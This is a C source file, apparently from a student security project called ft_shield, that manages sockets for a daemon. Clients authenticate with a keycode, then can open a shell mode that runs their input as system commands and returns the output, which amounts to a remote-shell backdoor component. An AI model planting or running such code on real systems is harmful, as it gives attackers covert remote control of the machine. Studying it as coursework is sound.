/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   client.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/10/26 14:53:57 by zcadinot          #+#    #+#             */
/*   Updated: 2026/10/26 14:53:59 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_shield.h"
#include "daemon.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern t_client g_clients[MAX_CLIENTS];

typedef struct s_shell_run
{
    int     slot;
    SOCKET  socket;
}   t_shell_run;

static DWORD WINAPI shell_reader(LPVOID param)
{
    t_shell_run run;
    t_client *client;

    run = *((t_shell_run *)param);
    free(param);
    client = &g_clients[run.slot];
    if (cmd_send_output(&client->cmd, run.socket))
        cli_send_str(client, run.socket, "\nshell> ");
    else
        cli_send_str(client, run.socket,
            COLOR_RED "Failed to read command output\n" COLOR_RESET);
    client->shell_busy = 0;
    return (0);
}

int cli_send(t_client *client, SOCKET socket, const char *buf, int len)
{
    int sent;

    sent = send(socket, buf, len, 0);
    if (sent > 0)
        client->bytes_out += sent;
    return sent;
}

int cli_send_str(t_client *client, SOCKET socket, const char *buf)
{
    return cli_send(client, socket, buf, (int)strlen(buf));
}

void client_reset(t_client *client, SOCKET socket)
{
    client->socket = socket;
    client->authenticated = 0;
    client->shell_mode = 0;
    client->shell_busy = 0;
    client->slot = -1;
    client->bytes_in = 0;
    client->bytes_out = 0;
    client->cmd = cmd_init();
}

int find_slot(t_client clients[], SOCKET socket)
{
    int slot;

    slot = 0;
    while (slot < MAX_CLIENTS && clients[slot].socket != socket)
        slot++;
    return slot;
}

void client_accept(SOCKET server_fd, t_client clients[], fd_set *fd_list)
{
    SOCKET client;
    int slot;

    client = accept(server_fd, NULL, NULL);
    if (client == INVALID_SOCKET)
    {
        return ;
    }
    slot = find_slot(clients, INVALID_SOCKET);
    if (slot == MAX_CLIENTS)
    {
        send(client, COLOR_RED "Server full\n" COLOR_RESET, 23, 0);
        closesocket(client);
        return ;
    }
    client_reset(&clients[slot], client);
    FD_SET(client, fd_list);
    cli_send_str(&clients[slot], client, COLOR_YELLOW "Keycode: " COLOR_RESET);
    log_write("CONNECT");
}

void client_disconnect(t_client clients[], SOCKET current, fd_set *fd_list)
{
    int slot;
    int busy;
    long bytes_in;
    long bytes_out;

    slot = find_slot(clients, current);
    if (slot == MAX_CLIENTS)
        return ;
    /* The shell reader thread may still use this slot: kill the pipe
       reader by stopping the shell, then reset AFTER a short grace. */
    busy = clients[slot].shell_busy;
    bytes_in = clients[slot].bytes_in;
    bytes_out = clients[slot].bytes_out;
    cmd_stop(&clients[slot].cmd);
    FD_CLR(current, fd_list);
    closesocket(current);
    client_reset(&clients[slot], INVALID_SOCKET);
    if (busy)
    {
        /* Let the pending reader notice the dead socket and exit. */
        Sleep(100);
        clients[slot].shell_busy = 0;
    }
    log_write("DISCONNECT (in: %ld, out: %ld)", bytes_in, bytes_out);
}

static void handle_auth(t_client *client, SOCKET socket, const char *buffer)
{
    if (verify_access(buffer))
    {
        client->authenticated = 1;
        log_write("AUTH OK");
        cli_send_str(client, socket, COLOR_GREEN "Authentication success\n" COLOR_RESET "$> ");
    }
    else
    {
        log_write("AUTH FAIL");
        cli_send_str(client, socket, COLOR_RED "Wrong keycode\n" COLOR_RESET COLOR_YELLOW "Keycode: " COLOR_RESET);
    }
}

static void handle_shell(t_client *client, int slot, const char *buffer)
{
    t_shell_run *run;

    if (strcmp(buffer, "exit") == 0)
    {
        cmd_stop(&client->cmd);
        client->shell_mode = 0;
        cli_send_str(client, client->socket,
            COLOR_CYAN "Leaving shell\n" COLOR_RESET "$> ");
        return ;
    }
    log_write("SHELL: %s", buffer);
    if (client->shell_busy)
    {
        cli_send_str(client, client->socket,
            "Previous command still running\nshell> ");
        return ;
    }
    if (!cmd_exec(&client->cmd, buffer))
    {
        cli_send_str(client, client->socket,
            COLOR_RED "Failed to execute command\n" COLOR_RESET "shell> ");
        return ;
    }
    run = malloc(sizeof(*run));
    if (run == NULL)
        return ;
    run->slot = slot;
    run->socket = client->socket;
    client->shell_busy = 1;
    if (CloseHandle(CreateThread(NULL, 0, shell_reader, run, 0, NULL)) == 0)
    {
        client->shell_busy = 0;
        free(run);
    }
}

static void handle_stats(t_client *client, SOCKET socket)
{
    char stats[96];

    snprintf(stats, sizeof(stats),
        "Received: %ld bytes | Sent: %ld bytes\n$> ",
        client->bytes_in, client->bytes_out);
    cli_send(client, socket, stats, (int)strlen(stats));
}

static void handle_shell_start(t_client *client, SOCKET socket)
{
    cmd_stop(&client->cmd);
    client->cmd = cmd_init();
    if (!cmd_start(&client->cmd))
    {
        cli_send_str(client, socket, COLOR_RED "Shell failed to start\n" COLOR_RESET "$> ");
        return ;
    }
    client->shell_mode = 1;
    cli_send_str(client, socket, COLOR_CYAN "Shell started\n" COLOR_RESET "shell> ");
}

static void handle_command(t_client *client, SOCKET socket, const char *buffer)
{
    if (strcmp(buffer, "?") == 0)
        cli_send_str(client, socket, help_message());
    else if (strcmp(buffer, "stats") == 0)
        handle_stats(client, socket);
    else if (strcmp(buffer, "shell") == 0)
        handle_shell_start(client, socket);
    else
    {
        log_write("CMD: %s", buffer);
        cli_send_str(client, socket, "Message received\n$> ");
    }
}

void client_handle(t_client clients[], SOCKET current, const char *buffer)
{
    int slot;

    slot = find_slot(clients, current);
    if (slot == MAX_CLIENTS)
        return ;
    if (!clients[slot].authenticated)
        handle_auth(&clients[slot], current, buffer);
    else if (clients[slot].shell_mode)
        handle_shell(&clients[slot], slot, buffer);
    else
        handle_command(&clients[slot], current, buffer);
}
